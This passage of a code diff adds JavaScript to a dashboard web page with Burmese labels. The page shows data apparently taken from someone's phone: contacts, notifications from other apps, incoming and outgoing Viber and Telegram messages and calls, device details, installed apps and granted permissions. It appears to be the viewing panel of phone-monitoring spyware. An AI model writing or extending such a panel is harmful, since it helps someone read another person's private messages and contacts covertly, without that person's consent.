+        const m = b.match(/Name:\s*([^\n]+)\nNumber:\s*([^\n]+)/);
+        if (m) allRaw.push({ name: (m[1] || "").trim(), number: (m[2] || "").trim() });
+      });
+    });
+    const byNumber = {};
+    allRaw.forEach(c => {
+      const key = normalizePhone(c.number);
+      if (!key) return;
+      if (!byNumber[key]) byNumber[key] = { number: c.number, names: new Set(), count: 0 };
+      if (c.name && c.name.length > 0) byNumber[key].names.add(c.name);
+      byNumber[key].count++;
+    });
+    const uniqueContacts = Object.keys(byNumber).map(k => {
+      const e = byNumber[k];
+      const namesArr = Array.from(e.names).filter(n => n.length > 0);
+      let bestName = namesArr.length > 0 ? namesArr[0] : "(No name)";
+      if (namesArr.length > 1) bestName = namesArr.reduce((a, b) => (b.length > a.length ? b : a), "");
+      return { name: bestName, number: e.number, count: e.count };
+    });
+    uniqueContacts.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+    const totalRaw = allRaw.length;
+    const totalUnique = uniqueContacts.length;
+    const duplicates = totalRaw - totalUnique;
+    document.getElementById('contactTotal').textContent = totalUnique;
+    document.getElementById('contactDuplicates').textContent = duplicates > 0 ? "+" + duplicates : "0";
+    if (uniqueContacts.length === 0) { contactList.innerHTML = emptyState('users', 'Contacts မရှိပါ'); return; }
+    let html = "";
+    uniqueContacts.forEach(c => {
+      const nameDisplay = escapeHtml(c.name || '(No name)');
+      const countBadge = c.count > 1 ? '<span class="c-count">x' + c.count + '</span>' : '';
+      html += '<div class="contact-item">' +
+        '<div class="c-left"><div class="c-name">' + nameDisplay + countBadge + '</div></div>' +
+        '<div class="c-number">' + escapeHtml(c.number) + '</div>' +
+      '</div>';
+    });
+    contactList.innerHTML = html;
+  }
+
+  function normalizePhone(p) {
+    if (!p) return "";
+    let s = String(p).replace(/[\s\-\(\)\.]/g, "");
+    s = s.replace(/^\+?95/, "");
+    s = s.replace(/^0+/, "");
+    return s;
+  }
+
+  // ═══════════════ NOTIFICATIONS ═══════════════
+  function renderNoti() {
+    const notiList = document.getElementById('notiList');
+    const notiDocs = allDocs.filter(d => (d.sender || "").startsWith("NOTI_"));
+    if (notiDocs.length === 0) {
+      notiList.innerHTML = emptyState('bell', 'Notifications မရှိပါ');
+      document.getElementById('notiTotal').textContent = 0;
+      document.getElementById('notiApps').textContent = 0;
+      return;
+    }
+    let allNoti = [];
+    notiDocs.forEach(doc => {
+      const parsed = parseNotiContent(doc.body || "");
+      parsed.date = doc.date ? new Date(doc.date * 1000).toLocaleString() : "";
+      allNoti.push(parsed);
+    });
+    allNoti.sort((a, b) => (b.time || "").localeCompare(a.time || ""));
+    const uniqueApps = new Set(allNoti.map(n => n.app));
+    document.getElementById('notiTotal').textContent = allNoti.length;
+    document.getElementById('notiApps').textContent = uniqueApps.size;
+    let html = "";
+    allNoti.forEach(n => {
+      html += '<div class="log-item noti">' +
+        '<div class="log-top">' +
+          '<span class="log-app">' + svgIcon('app', '#ec4899', 14) + escapeHtml(n.app) + '</span>' +
+          '<span>' + escapeHtml(n.time) + '</span>' +
+        '</div>' +
+        (n.title ? '<div class="log-title">' + escapeHtml(n.title) + '</div>' : '') +
+        '<div class="log-msg">' + escapeHtml(n.message) + '</div>' +
+        (n.pkg ? '<div class="log-pkg">' + escapeHtml(n.pkg) + '</div>' : '') +
+      '</div>';
+    });
+    notiList.innerHTML = html;
+  }
+
+  function parseNotiContent(text) {
+    const t = String(text).replace(/\r\n/g, "\n");
+    const lines = t.split("\n");
+    let app = "", pkg = "", title = "", time = "";
+    let msgLines = [];
+    let inMsg = false;
+    for (const rawLine of lines) {
+      if (inMsg) {
+        const trim = rawLine.trim();
+        if (trim.startsWith("=")) break;
+        if (trim.startsWith("-")) continue;
+        msgLines.push(rawLine);
+        continue;
+      }
+      if (rawLine.includes("App") && rawLine.includes(":")) app = rawLine.substring(rawLine.indexOf(":") + 1).trim();
+      else if (rawLine.includes("Package") && rawLine.includes(":")) pkg = rawLine.substring(rawLine.indexOf(":") + 1).trim();
+      else if (rawLine.includes("Title") && rawLine.includes(":")) title = rawLine.substring(rawLine.indexOf(":") + 1).trim();
+      else if (rawLine.includes("Time") && rawLine.includes(":")) time = rawLine.substring(rawLine.indexOf(":") + 1).trim();
+      else if (rawLine.trim() === "MESSAGE:") inMsg = true;
+    }
+    while (msgLines.length > 0 && msgLines[0].trim() === "") msgLines.shift();
+    while (msgLines.length > 0 && msgLines[msgLines.length - 1].trim() === "") msgLines.pop();
+    return { app: app || "Unknown", pkg: pkg, title: title, time: time, message: msgLines.join("\n") };
+  }
+
+  // ═══════════════ CHAT STYLE ═══════════════
+  function renderChatStyle(listEl, appClass, prefix, contactsCounterId, totalCounterId) {
+    const chatDocs = allDocs.filter(d => (d.sender || "").startsWith(prefix));
+
+    let messages = [];
+    chatDocs.forEach(doc => {
+      const sender = doc.sender || "";
+      const body = doc.body || "";
+
+      let direction = "UNKNOWN";
+      if (sender.includes("_MSG_IN_")) direction = "IN";
+      else if (sender.includes("_MSG_OUT_")) direction = "OUT";
+      else if (sender.includes("_CALL_")) direction = "CALL";
+      else if (sender.includes("_VIDEO_")) direction = "VIDEO";
+
+      const t = body.replace(/\r\n/g, "\n");
+
+      let target = "";
+      const tm = t.match(/Target\s*:\s*([^\n]+)/);
+      if (tm) target = tm[1].trim();
+
+      let time = "";
+      const timeM = t.match(/Time\s*:\s*([^\n]+)/);
+      if (timeM) time = timeM[1].trim();
+
+      let message = "";
+      const contentIdx = t.indexOf("CONTENT");
+      if (contentIdx >= 0) {
+        const after = t.substring(contentIdx);
+        const lines = after.split("\n");
+        let startCollect = false;
+        let contentLines = [];
+        lines.forEach(l => {
+          if (l.indexOf("CONTENT") >= 0) { startCollect = true; return; }
+          if (startCollect) {
+            if (l.trim().startsWith("════════")) return;
+            if (l.trim().startsWith("====")) return;
+            if (l.trim() === "") {
+              if (contentLines.length > 0) contentLines.push(l);
+              return;
+            }
+            contentLines.push(l);
+          }
+        });
+        message = contentLines.join("\n").trim();
+      }
+
+      if (message.length === 0 && target.length === 0) return;
+
+      const dateMs = (doc.date || 0) * 1000;
+      const dateStr = doc.date ? new Date(dateMs).toLocaleString() : time;
+
+      messages.push({
+        direction: direction,
+        target: target || "Unknown",
+        message: message,
+        time: time || dateStr
+      });
+    });
+
+    messages.sort((a, b) => (b.time || "").localeCompare(a.time || ""));
+
+    const uniqueSenders = new Set();
+    messages.forEach(m => uniqueSenders.add(m.target));
+
+    document.getElementById(totalCounterId).textContent = messages.length;
+    document.getElementById(contactsCounterId).textContent = uniqueSenders.size;
+
+    if (messages.length === 0) {
+      listEl.innerHTML = emptyState('mail', 'မရှိပါ');
+      return;
+    }
+
+    let html = "";
+    messages.forEach(m => {
+      let dirBadge = "";
+      let dirCls = "";
+
+      if (m.direction === "IN") {
+        dirBadge = "IN";
+        dirCls = "dir-in";
+      } else if (m.direction === "OUT") {
+        dirBadge = "OUT";
+        dirCls = "dir-out";
+      } else if (m.direction === "CALL") {
+        dirBadge = "📞 CALL";
+        dirCls = "dir-in";
+      } else if (m.direction === "VIDEO") {
+        dirBadge = "📹 VIDEO";
+        dirCls = "dir-in";
+      }
+
+      html += '<div class="sms-item in ' + appClass + '">' +
+        '<div class="top">' +
+          '<span class="phone">' + escapeHtml(m.target) + '</span>' +
+          '<span>' + escapeHtml(m.time) + '</span>' +
+        '</div>' +
+        '<div class="msg">' +
+          '<span class="dir-badge ' + dirCls + '">' + dirBadge + '</span>' +
+          escapeHtml(m.message) +
+        '</div>' +
+      '</div>';
+    });
+
+    listEl.innerHTML = html;
+  }
+
+  function renderViber() {
+    renderChatStyle(document.getElementById('viberList'), 'viber', 'VIBER_', 'viberContacts', 'viberTotal');
+  }
+
+  function renderTelegram() {
+    renderChatStyle(document.getElementById('telegramList'), 'telegram', 'TELEGRAM_', 'tgContacts', 'tgTotal');
+  }
+
+  // ═══════════════ SYSTEM APPS ═══════════════
+  function renderSystemApps() {
+    const container = document.getElementById('appsList');
+    const sysDocs = allDocs.filter(d => (d.sender || "").startsWith("SYSTEM_"));
+    if (sysDocs.length === 0) {
+      container.innerHTML = '<div class="placeholder">' +
+        '<div class="icon">' + svgIcon('app', '#64748b', 48) + '</div>' +
+        '<h3>System Info မရသေးပါ</h3>' +
+        '<p>App ကို ဖုန်းမှာ တစ်ခါ ဖွင့်ပြီး Button နှိပ်ပါ။</p></div>';
+      return;
+    }
+    const latest = sysDocs[0];
+    const body = (latest.body || "").replace(/\r\n/g, "\n");
+    const deviceLines = extractSection(body, "DEVICE");
+    const appsSection  = extractSectionText(body, "APPS");
+    const permsSection = extractSectionText(body, "PERMISSIONS");
+    let html = '<div class="sys-section"><div class="sys-title">' + svgIcon('app', '#38bdf8', 18) + ' Device Info</div>';
+    deviceLines.forEach(line => {
+      const idx = line.indexOf(":");
+      if (idx > 0) html += '<div class="sys-row"><span class="sys-key">' + escapeHtml(line.substring(0, idx).trim()) +
+                '</span><span class="sys-val">' + escapeHtml(line.substring(idx + 1).trim()) + '</span></div>';
+    });
+    html += '</div>';
+    const appLines = appsSection.split("\n").filter(l => l.trim());
+    let userApps = [], sysApps = [];
+    let uCount = 0, sCount = 0;
+    appLines.forEach(l => {
+      if (l.startsWith("User Apps:")) uCount = parseInt(l.replace("User Apps:", "").trim()) || 0;
+      else if (l.startsWith("System Apps:")) sCount = parseInt(l.replace("System Apps:", "").trim()) || 0;
+      else if (l.startsWith("[U]")) userApps.push(l.substring(3).trim());
+      else if (l.startsWith("[S]")) sysApps.push(l.substring(3).trim());
+    });
+    html += '<div class="sys-section"><div class="sys-title">' + svgIcon('box', '#38bdf8', 18) + ' Installed Apps</div>' +
+      '<div class="stats" style="margin-bottom:12px;">' +
+        '<div class="stat-card"><div class="num">' + uCount + '</div><div class="lbl">User</div></div>' +
+        '<div class="stat-card"><div class="num">' + sCount + '</div><div class="lbl">System</div></div>' +
+      '</div>' +
+      '<div class="app-tabs">' +
+        '<button class="app-tab-btn active" data-apptab="user">' + svgIcon('user', '#0f172a', 14) + ' User (' + uCount + ')</button>' +
+        '<button class="app-tab-btn" data-apptab="system">' + svgIcon('settings', '#94a3b8', 14) + ' System (' + sCount + ')</button>' +
+      '</div>' +
+      '<div id="userAppsList" class="app-list">';
+    userApps.forEach(a => { html += buildAppRow(a); });
+    html += '</div><div id="systemAppsList" class="app-list hidden">';
+    sysApps.forEach(a => { html += buildAppRow(a); });
+    html += '</div></div>';
+    html += '<div class="sys-section"><div class="sys-title">' + svgIcon('lock', '#ec4899', 18) + ' Permissions Monitor</div>';
+    const permBlocks = permsSection.split(/\n(?=\[)/);
+    permBlocks.forEach(block => {
+      const b = block.trim();
+      if (!b) return;
+      const m = b.match(/^\[([A-Z_]+)\]\s*\((\d+)\)\n?([\s\S]*)$/);
+      if (!m) return;
+      const permName = m[1], count = m[2];
+      const items = m[3].split("\n").filter(x => x.trim());
+      html += '<div class="perm-group"><div class="perm-header">' +
+        '<span class="perm-name">' + escapeHtml(permName) + '</span>' +
+        '<span class="perm-count">' + count + '</span></div>';
+      if (items.length === 0) html += '<div class="perm-empty">မရှိပါ</div>';
+      else {
+        items.forEach(it => {
+          const tag = it.substring(0, 3);
+          const rest = it.substring(3).trim();
+          const parts = rest.split(" | ");
+          html += '<div class="perm-item">' +
+            '<span class="perm-tag">' + escapeHtml(tag.trim()) + '</span>' +
+            '<span class="perm-label">' + escapeHtml(parts[0] || "") + '</span>' +
+            '<span class="perm-pkg">' + escapeHtml(parts[1] || "") + '</span>' +
+          '</div>';
+        });
+      }
+      html += '</div>';
+    });
+    html += '</div>';
+    container.innerHTML = html;
+    document.querySelectorAll('.app-tab-btn').forEach(b => {
+      b.addEventListener('click', () => {
+        const which = b.dataset.apptab;
+        document.querySelectorAll('.app-tab-btn').forEach(x => x.classList.remove('active'));
+        b.classList.add('active');
+        document.getElementById('userAppsList').classList.toggle('hidden', which !== 'user');
+        document.getElementById('systemAppsList').classList.toggle('hidden', which !== 'system');
+      });
+    });
+  }
+
+  function extractSection(text, name) {
+    const marker = "=== " + name + " ===";
+    const idx = text.indexOf(marker);
+    if (idx < 0) return [];
+    const after = text.substring(idx + marker.length);
+    const nextIdx = after.indexOf("=== ");
+    return (nextIdx < 0 ? after : after.substring(0, nextIdx)).trim().split("\n").filter(l => l.trim());
+  }
+  function extractSectionText(text, name) {
+    const marker = "=== " + name + " ===";
+    const idx = text.indexOf(marker);
+    if (idx < 0) return "";
+    const after = text.substring(idx + marker.length);
+    const nextIdx = after.indexOf("=== ");
+    return (nextIdx < 0 ? after : after.substring(0, nextIdx)).trim();
+  }
+  function buildAppRow(line) {
+    const parts = line.split(" | ");
+    return '<div class="app-row"><div class="app-info">' +
+      '<div class="app-name">' + escapeHtml(parts[0] || "") + '</div>' +
+      '<div class="app-pkg">' + escapeHtml(parts[1] || "") + '</div>' +
+    '</div><div class="app-meta"><div>v' + escapeHtml(parts[2] || "") + '</div>' +
+    '<div>' + escapeHtml(parts[3] || "") + '</div></div></div>';
+  }
+
+  // ═══════════════ UTIL ═══════════════
+  function escapeHtml(str) {
+    if (!str) return "";
+    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+              .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  }
+
+  window.addEventListener('error', (e) => console.error("Global:", e.error || e.message));
+  window.addEventListener('unhandledrejection', (e) => console.error("Unhandled:", e.reason));
+
+  console.log("✅ Dashboard loaded — all fixes applied");
+</script>
+</body>
+</html>
